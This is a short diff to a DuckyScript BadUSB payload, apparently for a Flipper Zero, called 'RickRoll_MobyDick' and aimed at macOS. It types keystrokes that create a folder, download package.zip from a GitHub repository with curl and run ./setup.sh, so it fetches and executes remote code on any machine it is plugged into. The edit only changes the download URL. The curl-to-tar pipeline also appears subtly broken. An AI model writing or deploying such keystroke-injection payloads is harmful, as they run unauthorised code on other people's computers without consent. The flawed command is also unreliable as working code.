@@ -10,7 +10,7 @@ STRING mkdir $HOME/Rickroll
 ENTER
 STRING cd $HOME/Rickroll
 ENTER
-STRING curl -O https://raw.githubusercontent.com/startrk1995/BadUSB/main/Bashbunny/MacOSX/RickRoll_MobyDick/Flipper/package.zip | tar xz 
+STRING curl -O https://raw.githubusercontent.com/startrk1995/BadUSB/main/Flipper/MacOSX/RickRoll_MobyDick/package.zip | tar xz 
 ENTER
 DELAY 200
 STRING ./setup.sh
